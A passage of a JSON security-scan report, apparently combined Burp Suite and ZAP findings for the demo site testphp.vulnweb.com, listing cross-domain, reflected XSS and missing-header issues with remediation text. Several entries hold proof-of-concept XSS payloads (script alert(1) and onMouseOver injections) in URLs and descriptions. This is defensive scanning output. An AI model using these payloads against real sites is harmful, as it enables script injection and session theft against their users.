                "reference": "https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/CrossDomain_PolicyFile_Specification.pdf\nhttps://learn.microsoft.com/en-us/previous-versions/windows/silverlight/dotnet-windows-silverlight/cc197955(v=vs.95)\nhttps://learn.microsoft.com/en-us/previous-versions/windows/silverlight/dotnet-windows-silverlight/cc838250(v=vs.95)",
                "tags": [
                    "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                    "",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy",
                    "https://cwe.mitre.org/data/definitions/264.html",
                    "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/crossdomain.xml"
                ]
            }
        ],
        "Wapiti": [],
        "Uncategorized": []
    },
    "Cross-Site Scripting (XSS)": {
        "Burp Suite": [
            {
                "name": "Cross-site scripting (reflected)",
                "type_index": 2097920,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "The value of the <b>artist</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>}}vy0ba&lt;script&gt;alert(1)&lt;/script&gt;ylfrm</b> was submitted in the artist parameter. This input was echoed as <b>vy0ba&lt;script&gt;alert(1)&lt;/script&gt;ylfrm</b> in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
                "issue_background": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
                "remediation_background": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \n  attacks can be prevented using two layers of defenses:</p>\n<ul>\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \nit is expected to contain. For example, personal names should consist of alphabetical \nand a small range of typographical characters, and be relatively short; a year of birth \nshould consist of exactly four numerals; email addresses should match a well-defined \nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\n<li>User input should be HTML-encoded at any point where it is copied into \napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\n<p>In cases where the application's functionality allows users to author content using \n  a restricted subset of HTML tags and attributes (for example, blog comments which \n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
                "paths": [
                    "/artists.php",
                    "/guestbook.php",
                    "/hpp/",
                    "/listproducts.php",
                    "/product.php",
                    "/guestbook.php",
                    "/showimage.php",
                    "/search.php"
                ],
                "severity": "high"
            }
        ],
        "ZAP": [
            {
                "alert": "User Controllable HTML Element Attribute (Potential XSS)",
                "risk": "Informational",
                "confidence": "Low",
                "description": "This check looks at user-supplied input in query string parameters and POST data to identify where certain HTML attribute values might be controlled. This provides hot-spot detection for XSS (cross-site scripting) that will require further review by a security analyst to determine exploitability.",
                "solution": "Validate all input and sanitize output it before writing to any HTML attributes.",
                "reference": "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html",
                "tags": [
                    "https://owasp.org/Top10/A03_2021-Injection/",
                    "https://cwe.mitre.org/data/definitions/20.html",
                    "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/guestbook.php"
                ]
            },
            {
                "alert": "Cross Site Scripting (Reflected)",
                "risk": "High",
                "confidence": "Medium",
                "description": "Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
                "solution": "Phase: Architecture and Design\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\nExamples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.\n\nPhases: Implementation; Architecture and Design\nUnderstand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.\nFor any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.\nConsult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.\n\nPhase: Architecture and Design\nFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.\n\nIf available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.\n\nPhase: Implementation\nFor every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.\n\nTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as \"red\" or \"blue.\"\n\nEnsure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.\n\t",
                "reference": "https://owasp.org/www-community/attacks/xss/\nhttps://cwe.mitre.org/data/definitions/79.html",
                "tags": [
                    "https://cwe.mitre.org/data/definitions/79.html",
                    "",
                    "https://owasp.org/Top10/A03_2021-Injection/",
                    "",
                    "",
                    "",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting",
                    "https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html",
                    "",
                    ""
                ],
                "urls": [
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/search.php?test=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/artists.php?artist=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/hpp/params.php?p=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&pp=12",
                    "http://testphp.vulnweb.com/listproducts.php?artist=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",
                    "http://testphp.vulnweb.com/listproducts.php?cat=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",
                    "http://testphp.vulnweb.com/product.php?pic=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",
                    "http://testphp.vulnweb.com/hpp/?pp=%22+onMouseOver%3D%22alert%281%29%3B",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/secured/newuser.php"
                ]
            }
        ],
        "Wapiti": [],
        "Uncategorized": []
    },
    "Security Header Misconfigurations": {
        "Burp Suite": [],
        "ZAP": [
            {
                "alert": "Content Security Policy (CSP) Header Not Set",
                "risk": "Medium",
                "confidence": "High",
                "description": "Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.",
                "solution": "Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.",
                "reference": "https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy\nhttps://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html\nhttps://www.w3.org/TR/CSP/\nhttps://w3c.github.io/webappsec-csp/\nhttps://web.dev/articles/csp\nhttps://caniuse.com/#feat=contentsecuritypolicy\nhttps://content-security-policy.com/",
                "tags": [
                    "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                    "https://cwe.mitre.org/data/definitions/693.html",
                    "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/sitemap.xml",
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/robots.txt",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/high",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/privacy.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "Sec-Fetch-Site Header is Missing",
                "risk": "Informational",
                "confidence": "High",
                "description": "Specifies the relationship between request initiator's origin and target's origin.",
                "solution": "Ensure that Sec-Fetch-Site header is included in request headers.",
                "reference": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site",
                "tags": [
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery",
                    "https://cwe.mitre.org/data/definitions/352.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/sitemap.xml",
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/robots.txt",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/style.css",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/high",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/privacy.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/images/logo.gif",
                    "http://testphp.vulnweb.com/Flash/add.swf",
                    "http://testphp.vulnweb.com/images/remark.gif",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/AJAX/styles.css",
                    "http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/secured/style.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "Sec-Fetch-Mode Header is Missing",
                "risk": "Informational",
                "confidence": "High",
                "description": "Allows to differentiate between requests for navigating between HTML pages and requests for loading resources like images, audio etc.",
                "solution": "Ensure that Sec-Fetch-Mode header is included in request headers.",
                "reference": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode",
                "tags": [
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery",
                    "https://cwe.mitre.org/data/definitions/352.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/sitemap.xml",
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/robots.txt",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/style.css",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/high",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/privacy.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/images/logo.gif",
                    "http://testphp.vulnweb.com/Flash/add.swf",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg",
                    "http://testphp.vulnweb.com/images/remark.gif",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/AJAX/styles.css",
                    "http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/secured/style.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "Sec-Fetch-Dest Header is Missing",
                "risk": "Informational",
                "confidence": "High",
                "description": "Specifies how and where the data would be used. For instance, if the value is audio, then the requested resource must be audio data and not any other type of resource.",
                "solution": "Ensure that Sec-Fetch-Dest header is included in request headers.",
                "reference": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest",
                "tags": [
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery",
                    "https://cwe.mitre.org/data/definitions/352.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/sitemap.xml",
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/robots.txt",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/style.css",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/high",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/privacy.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/images/logo.gif",
                    "http://testphp.vulnweb.com/Flash/add.swf",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg",
                    "http://testphp.vulnweb.com/images/remark.gif",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/AJAX/styles.css",
                    "http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
